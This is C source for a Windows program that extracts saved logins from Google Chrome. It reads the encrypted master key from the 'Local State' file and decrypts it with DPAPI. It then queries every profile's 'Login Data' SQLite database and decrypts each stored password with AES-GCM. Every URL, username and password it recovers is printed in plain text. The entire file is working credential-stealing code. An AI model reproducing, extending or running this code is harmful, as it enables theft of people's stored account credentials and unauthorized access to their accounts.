#include <windows.h>
#include <winsqlite/winsqlite3.h>
#include <stdio.h>
#include <crtdbg.h>
#include <Shlobj.h>
#include <wchar.h>
#include <shlwapi.h>
#include <stdlib.h>
#include <bcrypt.h>
#include <string.h>

#define ENC_MASTER_KEY_LEN 357
#define IV_LEN 12
#define TAG_LEN 16
#define CIPHER_LEN 300

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

BOOL get_chrome_directory(PWSTR buffer, SIZE_T buffer_size);							
BOOL get_enc_masterkey(PCWSTR chrome_dir, PWCHAR enc_master_key);						
BOOL decrypt_masterkey(PWCHAR enc_master_key, BCRYPT_KEY_HANDLE* handle_bcrypt);		
BOOL get_file_handle(PSTR chrome_dir, WIN32_FIND_DATAA* dir_files, HANDLE* dir_handle);
BOOL is_substring_in(const CHAR* substring, PCHAR test_string);
BOOL open_database_conn(PSTR chrome_dir_char, PSTR profile_name, sqlite3** handle_db);
BOOL get_credentials(BCRYPT_KEY_HANDLE handle_bcrypt, BYTE** enc_password, int * size_enc_password, BYTE** cipher_text, PULONG size_cipher_text, BYTE* iv, BYTE* tag, BYTE** tmp_pointer, BYTE** decrypted_byte, PULONG decrypted_byte_size);
BOOL decrypt_password(BCRYPT_KEY_HANDLE handle_bcrypt, BYTE* cipher_text, ULONG size_cipher_text, BYTE* iv, ULONG size_iv, BYTE* tag, ULONG size_tag, BYTE** decrypted_credentials, ULONG * size_decrypted_credentials);

int main() {
	WCHAR chrome_dir[MAX_PATH] = { L'\0' }, enc_master_key[ENC_MASTER_KEY_LEN] = { L'\0' };	// Buffer to hold Google Chrome directory, and Encrypted master key (encrypted using CryptProtectData())
	CHAR chrome_dir_char[MAX_PATH] = { '\0' };												// Chrome directory in CHAR (Later it will be used to get profile paths to get Login Data db
	BCRYPT_KEY_HANDLE handle_bcrypt;														// Handle to AES-GCM decrypting algorithm
	WIN32_FIND_DATAA dir_files;																// Handle to get file/folders on Chrome_dir
	HANDLE dir_handle;																		// Handle to a directory/file
	sqlite3* handle_db;																		// Handle to SQLite Database handle
	sqlite3_stmt* sql_stmt;																	// Handle to SQLite Query Statement
	int status;

	/* Gets the Chrome Folder if exists, which is% LOCALAPPDATA% \Google\Chrome\User Data */
	if (!get_chrome_directory(chrome_dir, MAX_PATH)) {
		printf("Getting chrome path error\n");
		exit(1);
	}

	/* Gets the Master Key of Chrome, which is inside% LOCALAPPDATA% \Google\Chrome\User Data\Local State */
	if (!get_enc_masterkey(chrome_dir, enc_master_key)) {
		printf("Getting 'Encrypted Master Key' error\n");
		exit(1);
	}

	/* Decrypts the Master keyand returns a AES - GCM decrypting algorithm to decrypt passwords. */
	if (!decrypt_masterkey(enc_master_key, &handle_bcrypt)) {
		printf("Decrypting 'Master Key' error\n");
		exit(1);
	}

	/* Converts the WCHAR chrome directory path to CHAR */
	size_t size_returned_char_master_key;
	errno_t err;
	if ((err = wcstombs_s(&size_returned_char_master_key, chrome_dir_char, MAX_PATH * sizeof(CHAR), chrome_dir, (MAX_PATH - 1) * sizeof(CHAR)))) {
		printf("wcstombs_s: Error when converting wchar master key to char master key, error: %d\n", err);
		exit(1);
	}

	/* Gets a file handle for Chrome directory to list the files in that directory */
	if (!get_file_handle(chrome_dir_char, &dir_files, &dir_handle)) {
		printf("Getting Chrome Directory file handle failed\n");
		exit(1);
	}

	/* Go through the files/folders in that directory */

	BYTE iv[IV_LEN] = { 0 }, tag[TAG_LEN] = { 0 };
	ULONG decrypted_credential_size = CIPHER_LEN, default_cipher_text_size = CIPHER_LEN;
	BYTE* cipher_text_byte = (BYTE*)malloc(default_cipher_text_size);
	if (!cipher_text_byte) {
		printf("malloc: Error when allocating buffer for 'cipher_text_byte'\n");
		return FALSE;
	}
	BYTE* tmp_cipher_text_byte;
	BYTE* decrypted_credential = (BYTE*)malloc(decrypted_credential_size);
	if (!decrypted_credential) {
		printf("malloc: Error when allocating buffer for 'decrypted_credential'\n");
		return FALSE;
	}
	BYTE* data_blob;
	int data_blob_size;
	

	memset(cipher_text_byte, 0, default_cipher_text_size);
	memset(decrypted_credential, 0, decrypted_credential_size);

	do {
		if (is_substring_in("Default", dir_files.cFileName) || is_substring_in("Profile", dir_files.cFileName)) {	// Check if a folder starts with "Deafult" or "Profile \d?" to identify profile directories
			
			printf("------------------------ %s ------------------------\n", dir_files.cFileName);

			/* Open database connection */
			if (!open_database_conn(chrome_dir_char, dir_files.cFileName, &handle_db)) {
				printf("Error when opening database\n");
				continue;
			}

			/* Create a SQL statement to be executed */
			if ((status = sqlite3_prepare_v2(handle_db, "SELECT origin_url,username_value,password_value FROM logins", -1, &sql_stmt, 0)) != SQLITE_OK) {
				printf("sqlite3_prepare_v2: Error when preaparing statement, error: %s:%d\n", sqlite3_errmsg(handle_db), status);
				continue;
			}

			/* Ietrate over results one by one */
			while ((status = sqlite3_step(sql_stmt)) == SQLITE_ROW) {
				printf("URL: %s\n", sqlite3_column_text(sql_stmt, 0));
				printf("Username: %s\n", sqlite3_column_text(sql_stmt, 1));

				/* Gets the size of the data_blob, which is the encrypted credentials */
				data_blob_size = sqlite3_column_bytes(sql_stmt, 2);

				/* Gets the data_blob to buffer */
				data_blob = (BYTE*)sqlite3_column_blob(sql_stmt, 2);

				/* Gets the decrypted password */
				if (!get_credentials(handle_bcrypt, &data_blob, &data_blob_size, &cipher_text_byte, &default_cipher_text_size, iv, tag, &tmp_cipher_text_byte, &decrypted_credential, &decrypted_credential_size)) {
					printf("Getting decrypted password error\n");
					continue;
				}

				///* Reallocates if the size is not enough in the data_blob buffer */
				//if (CIPHER_LEN < data_blob_size) {
				//	tmp_cipher_text_byte = (BYTE*)realloc(cipher_text_byte, data_blob_size);
				//	if (tmp_cipher_text_byte) {
				//		cipher_text_byte = tmp_cipher_text_byte;
				//		default_cipher_text_size = data_blob_size;
				//	}
				//	else {
				//		printf("Couldn't reallocate memory for cipher_text_byte\n");
				//		continue;
				//	}
				//}

				///* Set the IV, TAG, and CIPHER TEXT in corresponding buffers */
				//memcpy_s(iv, IV_LEN, data_blob + 3, IV_LEN);
				//memcpy_s(cipher_text_byte, default_cipher_text_size, data_blob + 3 + 12, data_blob_size - (3 + 12 + 16));
				//memcpy_s(tag, TAG_LEN, data_blob + (data_blob_size - 16), 16);

				///* Decrypt the encrypted data_blob to get the password */
				//if (!decrypt_password(handle_bcrypt, cipher_text_byte, data_blob_size - (3 + 12 + 16), iv, IV_LEN, tag, TAG_LEN, &decrypted_credential, &decrypted_credential_size)) {
				//	printf("Decrypting password error\n");
				//	continue;
				//}

				//printf("Password: %s\n", decrypted_credential);

				///* Reset buffers, otherwise there could be overlaps */
				//memset(iv, 0, IV_LEN);
				//memset(tag, 0, TAG_LEN);
				//memset(cipher_text_byte, 0, default_cipher_text_size);
				//memset(decrypted_credential, 0, decrypted_credential_size);

				printf("------------------------------------------\n");
			}

			/* If any error occurs */
			if (status != SQLITE_ROW) {
				printf("!!! %s:%d\n", sqlite3_errmsg(handle_db), status);
			}

			/* Reset SQL statement */
			if ((status = sqlite3_reset(sql_stmt)) != 0) {
				printf("sqlite3_reset: %s:%d\n", sqlite3_errmsg(handle_db), status);
			}
			
			/* Close the opened database */
			sqlite3_close(handle_db);

			/* Clears the appended '\' + Profile Name + '\Login Data' from the chrome_dir_char to append the path for Login Data for the next user */
			memset(chrome_dir_char + lstrlenA(chrome_dir_char) - lstrlenA(dir_files.cFileName) - 12, '\0', lstrlenA(dir_files.cFileName) + 12);
		}
	} while (FindNextFileA(dir_handle, &dir_files));

	/* Free allocated memory to prevent leaks */
	free(cipher_text_byte);
	free(decrypted_credential);
	_CrtDumpMemoryLeaks();
	return 0;
}

BOOL get_chrome_directory(PWSTR buffer, SIZE_T buffer_size) {
	PWSTR p_temp_chrome_dir;																	// Temporary pointer to hold returned %LOCALAPPDATA% folder path
	HRESULT hr;																					// Error handling 
	errno_t err;																				// Error handling 

	/* Get Local Appdata Directory of the user */
	if (FAILED(hr = SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &p_temp_chrome_dir))) {
		printf("SHGetKnownFolderPath: Getting Local Appdata Directory error code: %d\n", hr);
		CoTaskMemFree(p_temp_chrome_dir);
		return FALSE;
	}

	/* Copy %LOCALAPPDATA% location to permenant buffer */
	if ((err = wmemcpy_s(buffer, buffer_size, p_temp_chrome_dir, lstrlenW(p_temp_chrome_dir))) != 0) {
		printf("wmemcpy_s: Copying %%LOCALAPPDATA%% to buffer error code: %d\n", err);
		return FALSE;
	}

	/* Copy relative path of Chrome directory from %LOCALAPPDATA% to permenant buffer */
	if ((err = wmemcpy_s(buffer + lstrlenW(p_temp_chrome_dir), buffer_size, L"\\Google\\Chrome\\User Data", 25)) != 0) {
		printf("wmemcpy_s: Copying Chrome Userdata folder to buffer error code: %d\n", err);
		return FALSE;
	}

	/* Check if that Chrome path exitsts */
	if (!PathFileExistsW(buffer)) {
		printf("PathFileExistsW: No folder found.\n");
		return FALSE;
	}

	/* Free the memory allocated by temporary buffer to hold the %LOCALAPPDATA% folder */
	CoTaskMemFree(p_temp_chrome_dir);
	return TRUE;
}

BOOL get_enc_masterkey(PCWSTR chrome_dir, PWCHAR enc_master_key) {
	FILE* fp_local_state_file = NULL;												// File pointer to 'Local State' file
	WCHAR local_state_location[MAX_PATH], buffer[2];								// First Buffer to hold path for 'Local State' file, and the second buffer to hold two wchars (including null-term). Buffer is used to read file
	BOOL quoteFound = FALSE, propertyFound = FALSE;	
	errno_t err;
	int i = 0;

	/* Copy chrome path to temporary buffer */
	if ((err = wmemcpy_s(local_state_location, MAX_PATH, chrome_dir, lstrlenW(chrome_dir))) != 0) {
		printf("wmemcpy_s: Copying Chrome path to buffer error code: %d\n", err);
		return FALSE;
	}

	/* Add '\Local State' to temporary buffer */
	if ((err = wmemcpy_s(local_state_location + lstrlenW(chrome_dir), MAX_PATH, L"\\Local State", 13)) != 0) {
		printf("wmemcpy_s: Copying 'Local State' file path to buffer error code: %d\n", err);
		return FALSE;
	}

	/* Check if Local State file exists */
	if (!PathFileExistsW(local_state_location)) {
		printf("PathFileExistsW: No 'Local State' file found.\n");
		return FALSE;
	}

	/* Opens the 'Local State' file in UTF-8 mode */
	if ((err = _wfopen_s(&fp_local_state_file, local_state_location, L"r, ccs=UTF-8")) != 0) {
		printf("_wfopen_s: Opening Local State file error code: %d:%d\n", err, errno);
	}
	if (fp_local_state_file == NULL ) {
		_wcserror_s(enc_master_key, ENC_MASTER_KEY_LEN, err);
		return FALSE;
	}

	/* Read and get the encrypted key */
	while (fgetws(buffer, 2, fp_local_state_file)) {
		if (!wcscmp(buffer, L"\"")) {
			if (!quoteFound) {
				quoteFound = TRUE;
				continue;
			}
			else {
				quoteFound = FALSE;
				if (!wcscmp(enc_master_key, L"encrypted_key")) {
					wmemset(enc_master_key, L'\0', ENC_MASTER_KEY_LEN);
					i = 0;
					propertyFound = TRUE;
					continue;
				}
				if (propertyFound) {
					enc_master_key[i] = (WCHAR)L'\0';
					if ((err = fclose(fp_local_state_file)) != 0)
						printf("fclose: Local File closing error code: %d\n", err);
					return TRUE;
				}
				enc_master_key[i] = L'\0';
				wmemset(enc_master_key, L'\0', ENC_MASTER_KEY_LEN);
				i = 0;
			}
		}
		else if (quoteFound) {
			enc_master_key[i] = buffer[0];
			i++;
		}
	}

	/* If encrypted key is not found */
	if ((err = fclose(fp_local_state_file)) != 0)
		printf("fclose: Local File closing error code: %d\n", err);
	return FALSE;
}

BOOL decrypt_masterkey(PWCHAR enc_master_key, BCRYPT_KEY_HANDLE* p_handle_key) {
	CHAR char_master_key[ENC_MASTER_KEY_LEN];											// Buffer to hold encrypted BASE64 encoded char type master key
	size_t size_returned_char_master_key;												// To hold resulting bytes after converting WCHAR Base64 encoded encrypted master key to CHAR
	DWORD size_byte_master_key = NULL, bytesDone = 0;									// To hold size of byte form master key, to hold how many bytes used by Bcrypt 
	BCRYPT_ALG_HANDLE handle_bcrypt_algorithm;											// Handle to Bcrypt ALG algorithm provider
	DATA_BLOB blob_enc_masterkey, blob_dec_masterkey;									// DATA_BLOBs to hold byte form of encrypted and decrypted master keys
	errno_t err;
	NTSTATUS bcryptStatus = 0;

	/* 
	Master key in the 'Local State' file is encoded in Base64, after decoding it into byte form, there will be 5 bytes of 'DPAPI' string to identify
	the encryption type of the Master key, DPAPI is the API provided by Windows to protect data (using CryptProtectData()). So 'DPAPI' is removed and then
	rest of the bytes are decrypted using CryptUnProtectData() funciton. And then 
	*/
	/* Convert WCHAR form of Base64 encoded master key to CHAR */
	if ((err = wcstombs_s(&size_returned_char_master_key, char_master_key, ENC_MASTER_KEY_LEN * sizeof(CHAR), enc_master_key, (ENC_MASTER_KEY_LEN-1)*sizeof(CHAR)))) {
		printf("wcstombs_s: Error when converting wchar master key to char master key, error: %d\n", err);
		return FALSE;
	}
	/* To Convert CHAR form of Base64 encoded master key to Byte form, the resulting buffer size is needed, so 'size_byte_master_key' is passed to get that value */
	if (!(CryptStringToBinaryA(char_master_key, 0, CRYPT_STRING_BASE64, NULL, &size_byte_master_key, NULL, NULL))) {
		printf("CryptStringToBinaryA: Error when getting size of the buffer to hold byte master key, error: %d\n", err);
		return FALSE;
	}
	/* Using above 'size_byte_master_key', a buffer is created to hold Byte form of Base64 encoded master key */
	BYTE* byte_master_key = (BYTE*)malloc(size_byte_master_key);
	if (!byte_master_key) {
		printf("malloc: Error when allocating memory for byte master key\n");
		return FALSE;
	}
	/* Convert Base64 encoded master key into byte form */
	if (!(CryptStringToBinaryA(char_master_key, 0, CRYPT_STRING_BASE64, byte_master_key, &size_byte_master_key, NULL, NULL))) {
		printf("CryptStringToBinaryA: Error when converting and placing byte master key, error: %d\n", err);
		return FALSE;
	}
	/* Move the bytes in 'byte_master_key' to left by 5 bytes. So the bytes of 'DPAPI' will be overwritten. */
	memmove(byte_master_key, byte_master_key + 5, size_byte_master_key);
	/* Then the resulting bytes will be placed on 'DATA_BLOB' structure to Decrypt it using CryptUnProtectData(), then it will be decrypted and decrypted and resulting data will be placed on 'blob_dec_masterkey'*/
	blob_enc_masterkey.cbData = size_byte_master_key - 5;
	blob_enc_masterkey.pbData = byte_master_key;
	if (!(CryptUnprotectData(&blob_enc_masterkey, NULL, NULL, NULL, NULL, 0, &blob_dec_masterkey))) {
		printf("CryptUnprotectData: Master key decryption failed.\n");
		return FALSE;
	}

	/* 
	Chrome passwords are encrypted using AES-256-GCM encrypting algorithm (symetric). So Decrypting algorithm provider is opened and the returned resulting handle to actully 
	decrypt passwords using that handle.
	*/
	bcryptStatus = BCryptOpenAlgorithmProvider(&handle_bcrypt_algorithm, BCRYPT_AES_ALGORITHM, 0, 0);
	if (!BCRYPT_SUCCESS(bcryptStatus)) {
		printf("BCryptOpenAlgorithmProvider: Error getting BCrypt handle, error: %ld\n", bcryptStatus);
		return FALSE;
	}
	bcryptStatus = BCryptSetProperty(handle_bcrypt_algorithm, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
	if (!BCRYPT_SUCCESS(bcryptStatus)) {
		printf("BCryptSetProperty: Error setting BCrypt handle, error: %ld\n", bcryptStatus);
		return FALSE;
	}
	BCRYPT_AUTH_TAG_LENGTHS_STRUCT authTagLengths;
	bcryptStatus = BCryptGetProperty(handle_bcrypt_algorithm, BCRYPT_AUTH_TAG_LENGTH, (BYTE*)&authTagLengths, sizeof(authTagLengths), &bytesDone, 0);
	if (!BCRYPT_SUCCESS(bcryptStatus)) {
		printf("BCryptGetProperty: Error getting BCrypt handle, BCRYPT_AUTH_TAG_LENGTH, error: %ld\n", bcryptStatus);
		return FALSE;
	}
	DWORD blockLength = 0;
	bcryptStatus = BCryptGetProperty(handle_bcrypt_algorithm, BCRYPT_BLOCK_LENGTH, (BYTE*)&blockLength, sizeof(blockLength), &bytesDone, 0);
	if (!BCRYPT_SUCCESS(bcryptStatus)) {
		printf("BCryptGetProperty: Error getting BCrypt handle, BCRYPT_BLOCK_LENGTH, error: %ld\n", bcryptStatus);
		return FALSE;
	}
	bcryptStatus = BCryptGenerateSymmetricKey(handle_bcrypt_algorithm, p_handle_key, 0, 0, blob_dec_masterkey.pbData, blob_dec_masterkey.cbData, 0);
	if (!BCRYPT_SUCCESS(bcryptStatus)) {
		printf("BCryptGenerateSymmetricKey: Error generating Symetric key, error: %ld\n", bcryptStatus);
		return FALSE;
	}

	free(byte_master_key);
	return TRUE;
}

BOOL get_file_handle(PSTR chrome_dir, WIN32_FIND_DATAA* dir_files, HANDLE * dir_handle) {
	errno_t err;

	/* Append '\*' to the chrome_dir to get the file handle for the '%LOCALAPPDATA%\Google\Chrome\User Data\*' folder */
	if ((err = strcat_s(chrome_dir, MAX_PATH, "\\*")) != 0) {
		printf("strcat_s: Appending '\\\\*' to chrome_dir error: %d\n", err);
		return FALSE;
	}

	/* Gets the first file/folder handle in the directory, and set it to 'dir_handle' */
	*dir_handle = FindFirstFileA(chrome_dir, dir_files);
	if (dir_handle == INVALID_HANDLE_VALUE) {
		printf("Getting sub directories error: %d\n", GetLastError());
		return FALSE;
	}

	/* Clears the ending '\*' part in the chrome_dir */
	memset(chrome_dir + lstrlenA(chrome_dir) - 2, '\0', 2);

	return TRUE;
}

BOOL is_substring_in(const CHAR * substring, PCHAR test_string) {
	int i = 0;
	if (lstrlenA(substring) <= lstrlenA(test_string)) {
		for (i = 0; i < lstrlenA(substring); i++) {
			if (substring[i] != test_string[i]) return FALSE;
		}
		return TRUE;
	}
	return FALSE;
}

BOOL decrypt_password(BCRYPT_KEY_HANDLE handle_bcrypt, BYTE * cipher_text, ULONG size_cipher_text,  BYTE * iv, ULONG size_iv, BYTE * tag, ULONG size_tag, BYTE ** decrypted_credentials, ULONG * size_decrypted_credentials) {
	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO aes_gcm_info;						// Struct to hold additional information required for decrypting (Nonce, Tag)
	ULONG size_required_decrypted_buffer;									// To get the size required to hold decrypted bytes
	BYTE* tmp_byte;															// Temporary pointer, in case if the buffer to hold decrypted bytes is not enough
	NTSTATUS status;						

	/* Set Additional info to the struct */
	BCRYPT_INIT_AUTH_MODE_INFO(aes_gcm_info);
	aes_gcm_info.pbNonce = iv;
	aes_gcm_info.cbNonce = size_iv;
	aes_gcm_info.pbTag = tag;
	aes_gcm_info.cbTag = size_tag;

	/* Get the buffer size required to hold the decrypted bytes to the 'size_required_decrypted_buffer' */
	status = BCryptDecrypt(handle_bcrypt, cipher_text, size_cipher_text, &aes_gcm_info, NULL, 0, NULL, 0, &size_required_decrypted_buffer, 0);
	if (!NT_SUCCESS(status)) {
		printf("BCryptDecrypt: Error getting decrypted text size, error: %ld\n", status);
		return FALSE;
	}

	/* In case if the existing buffer size is not enough, Resize it to fit */
	if (size_required_decrypted_buffer > *size_decrypted_credentials) {
		tmp_byte = (BYTE*)realloc(*decrypted_credentials, size_required_decrypted_buffer);
		
		if (!tmp_byte) {
			printf("realloc: Error when reallocating size of decrypted_credentials_buffer\n");
			return FALSE;
		}
		else {
			*decrypted_credentials = tmp_byte;
			*size_decrypted_credentials = size_required_decrypted_buffer;
		}
	}

	/* Actual decryption process */
	status = BCryptDecrypt(handle_bcrypt, cipher_text, size_cipher_text, &aes_gcm_info, NULL, 0, *decrypted_credentials, *size_decrypted_credentials, &size_required_decrypted_buffer, 0);
	if (!NT_SUCCESS(status)) {
		printf("BCryptDecrypt: Error getting decrypted text size, error: %ld\n", status);
		return FALSE;
	}

	return TRUE;
}

BOOL open_database_conn(PSTR chrome_dir_char, PSTR profile_name, sqlite3** handle_db) {
	errno_t err;
	int status;

	if ((err = strcat_s(chrome_dir_char, MAX_PATH, "\\")) != 0) {											// Apend '\\' to the end of chrome_dir_char to make the path for Login Data file for a specific user profile
		printf("strcat_s: Appending '\\\\' to chrome_dir_char error: %d\n", err);
		return FALSE;
	}
	if ((err = strcat_s(chrome_dir_char, MAX_PATH, profile_name)) != 0) {									// Append "Default" or "Profile \d?" to the end of chrome_dir_char
		printf("strcat_s: Appending '%s' to chrome_dir_char error: %d\n", profile_name, err);
		return FALSE;
	}
	if ((err = strcat_s(chrome_dir_char, MAX_PATH, "\\Login Data")) != 0) {									// Append '\Login Data' to end of chrome_dir_char
		printf("strcat_s: Appending 'Login Data' to chrome_dir_char error: %d\n", err);
		return FALSE;
	}

	if ((status = sqlite3_open_v2(chrome_dir_char, handle_db, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK) {	// Opens the connection to database
		printf("sqlite3_open_v2: Error when opening database connection to '%s', error: %s:%d\n", profile_name, sqlite3_errmsg(*handle_db), status);
		return FALSE;
	}

	return TRUE;
}

BOOL get_credentials(BCRYPT_KEY_HANDLE handle_bcrypt, BYTE** enc_password, int* size_enc_password, BYTE** cipher_text, PULONG size_cipher_text, BYTE* iv, BYTE* tag, BYTE** tmp_pointer, BYTE** decrypted_byte, PULONG decrypted_byte_size) {
	/* Reallocates if the size is not enough in the data_blob buffer */
	if (CIPHER_LEN < *size_enc_password) {
		*tmp_pointer = (BYTE*)realloc(*cipher_text, *size_enc_password);
		if (*tmp_pointer) {
			*cipher_text = *tmp_pointer;
			*size_cipher_text = *size_enc_password;
		}
		else {
			printf("Couldn't reallocate memory for cipher_text_byte\n");
			return FALSE;
		}
	}

	/* Set the IV, TAG, and CIPHER TEXT in corresponding buffers */
	memcpy_s(iv, IV_LEN, *enc_password + 3, IV_LEN);
	memcpy_s(*cipher_text, *size_cipher_text, *enc_password + 3 + 12, *size_enc_password - (3 + 12 + 16));
	memcpy_s(tag, TAG_LEN, *enc_password + (*size_enc_password - 16), 16);

	/* Decrypt the encrypted data_blob to get the password */
	if (!decrypt_password(handle_bcrypt, *cipher_text, *size_enc_password - (3 + 12 + 16), iv, IV_LEN, tag, TAG_LEN, decrypted_byte, decrypted_byte_size)) {
		printf("Decrypting password error\n");
		return FALSE;
	}

	printf("Password: %s\n", *decrypted_byte);

	/* Reset buffers, otherwise there could be overlaps */
	memset(iv, 0, IV_LEN);
	memset(tag, 0, TAG_LEN);
	memset(*cipher_text, 0, *size_cipher_text);
	memset(*decrypted_byte, 0, *decrypted_byte_size);

	return TRUE;
}
